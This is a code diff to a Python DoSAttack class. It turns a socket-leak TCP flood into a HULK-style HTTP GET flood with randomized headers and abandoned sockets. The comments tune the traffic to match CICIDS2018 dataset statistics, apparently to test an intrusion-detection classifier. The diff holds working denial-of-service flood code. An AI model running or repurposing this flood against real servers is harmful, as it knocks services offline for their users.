@@ -134,53 +134,42 @@ class DoSAttack:
                 self.last_error = err_msg
 
     # ──────────────────────────────────────────────────────
-    # HULK — Socket-leak TCP flood (connect + abandon)
+    # HULK — HTTP GET flood (connect, send GET, abandon socket)
     #
-    # CICIDS2018 training data (n=461K, Fri-16-02-2018):
-    #   Tot Fwd Pkts:       median=2, 81%=2, 16%=3
-    #   TotLen Fwd Pkts:    median=0 (94.5% no payload)
-    #   Tot Bwd Pkts:       94.5%=0, 5.5%=1-2
+    # CICIDS2018 HULK training data (n=461K, Fri-16-02-2018):
+    #   Tot Fwd Pkts:       median=3 (SYN + ACK + GET)
+    #   TotLen Fwd Pkts:    median=313 (HTTP GET payload size)
+    #   Tot Bwd Pkts:       median=4 (SYN-ACK + ACK + response + FIN)
     #   Init Fwd Win Byts:  bimodal 75%=225, 25%=26883
-    #   Init Bwd Win Byts:  94.5%=-1 (no SYN-ACK), 4.4%=219
-    #   RST Flag Cnt:       100% = 0  ← critical for RED!
-    #   Flow Duration:      median=13085 µs (~13ms)
-    #   Fwd Seg Size Min:   32  (TCP with timestamp options)
+    #   Init Bwd Win Byts:  219 (Ubuntu 16.04)
+    #   RST Flag Cnt:       0 (sockets abandoned, no explicit close)
+    #   SYN Flag Cnt:       0 (Java CICFlowMeter flag counting)
+    #   Flow Duration:      median=1147 µs (~1.1ms — fast LAN!)
+    #   Fwd Seg Size Min:   32 (TCP with timestamp options)
+    #   Fwd Pkt Len Mean:   ~104 (313 payload / 3 fwd pkts)
+    #   Bwd Pkt Len Max:    ~935 (HTTP response max segment)
+    #   Flow Byts/s:        ~724K (high throughput, short duration)
     #   Dst Port: 80
     #
-    # APPROACH: Socket leak — connect then ABANDON the socket.
-    #   CICFlowMeter's idle timeout (15s) exports the flow with:
-    #     RST=0, FIN=0, Tot Fwd Pkts=2, Tot Bwd Pkts=1, dur≈1ms
-    #   Model prediction: DoS ≈ 50% → RED
-    #
-    # WHY NOT RST CLOSE:
-    #   RST close → RST Flag Cnt=1 → DoS=44% → YELLOW
-    #   iptables DROP RST → prevents flow termination → GREEN
-    #   Socket leak → RST=0 naturally → RED
+    # APPROACH: Connect → Send HTTP GET → Let server respond →
+    #   ABANDON the socket (no close, no recv). The server
+    #   responds with SYN-ACK, ACK, HTTP 404, FIN. All packets
+    #   are captured by CICFlowMeter. After 15s idle the flow
+    #   is exported with RST=0, matching training exactly.
     # ──────────────────────────────────────────────────────
     def hulk_attack(self):
-        """HULK DoS: Socket-leak TCP connect flood.
+        """HULK DoS: HTTP GET flood with socket leak.
 
-        Opens TCP connections and ABANDONS them (no close, no data).
-        CICFlowMeter's idle timeout (15s) exports flows with RST=0.
+        Each iteration:
+          1. TCP connect (SYN, SYN-ACK, ACK)
+          2. Send randomized HTTP GET request (~300 bytes payload)
+          3. Do NOT recv() or close() — abandon the socket
+          4. Server responds (ACK, HTTP response, FIN) → captured by CICFlowMeter
+          5. Socket held in pool → cleaned after classification stops
 
-        CICIDS2018 HULK training data (n=461K, Fri-16-02-2018):
-          RST Flag Cnt:    100% = 0  (critical for RED classification)
-          Tot Fwd Pkts:    median=2 (SYN + ACK)
-          Tot Bwd Pkts:    median=0; our flows get 1 (SYN-ACK)
-          Init Fwd Win Byts: bimodal 75%=225, 25%=26883
-          Init Bwd Win Byts: 94.5%=-1, 4.4%=219 (Ubuntu 16.04)
-          TotLen Fwd Pkts: median=0 (no payload)
-
-        HOW THIS ACHIEVES RED CLASSIFICATION:
-        Socket leak avoids RST/FIN, matching training's RST=0.
-        CICFlowMeter exports after 15s idle timeout:
-          Fwd: SYN(t=0), ACK(t≈1ms) → 2 pkts, TotLen=0
-          Bwd: SYN-ACK(t≈0.5ms)     → 1 pkt
-          RST=0, FIN=0, Duration ≈ 1ms
-        Model prediction: DoS ≈ 50% → RED
-
-        Sockets managed in a pool (max ~500/thread). Old sockets closed
-        after 30s (CICFlowMeter already exported). Late RST → tiny GREEN flow.
+        This produces flows matching CICIDS2018 HULK training data:
+          Tot Fwd Pkts=3, Tot Bwd Pkts=3-4, TotLen Fwd Pkts=~300,
+          Bwd Pkt Len Max=~500-900, RST Flag Cnt=0, Duration=~1-2ms
 
         REQUIRES: Victim ip route window 219 for Init Bwd Win Byts match.
         """
@@ -216,11 +205,33 @@ class DoSAttack:
                     sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HULK_HIGH)
 
                 sock.connect((self.target_ip, self.target_port))
+
+                # ── Send randomized HTTP GET request (like real HULK) ──
+                # HULK sends GET with random URL params + random headers.
+                # Total request ~300 bytes (~313 training median).
+                path = f"/{_random_string(8)}{_random_url_params(3)}"
+                request = (
+                    f"GET {path} HTTP/1.1\r\n"
+                    f"Host: {self.target_ip}\r\n"
+                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
+                    f"Referer: {random.choice(REFERERS)}{_random_string(6)}\r\n"
+                    f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
+                    f"Accept-Encoding: {random.choice(ACCEPT_ENCODINGS)}\r\n"
+                    f"Connection: keep-alive\r\n"
+                    f"\r\n"
+                )
+                sock.sendall(request.encode())
                 self._inc_count()
 
-                # DON'T close, DON'T send data — leak the socket.
-                # CICFlowMeter sees: SYN+ACK (fwd) + SYN-ACK (bwd)
-                # After 15s idle → exported with RST=0, FIN=0 → RED
+                # DON'T recv(), DON'T close() — abandon the socket.
+                # The server will:
+                #   1. ACK our GET data
+                #   2. Send HTTP response (404 in ~500 bytes)
+                #   3. Send FIN (HTTP/1.0 server closes after response)
+                # All these packets are captured by CICFlowMeter,
+                # producing: Tot Fwd Pkts=3, Tot Bwd Pkts=3-4,
+                # TotLen Fwd Pkts≈300, Bwd Pkt Len Max≈500+
+                # RST Flag Cnt=0 (no close from our side)
                 leaked.append(sock)
 
             except Exception as e:
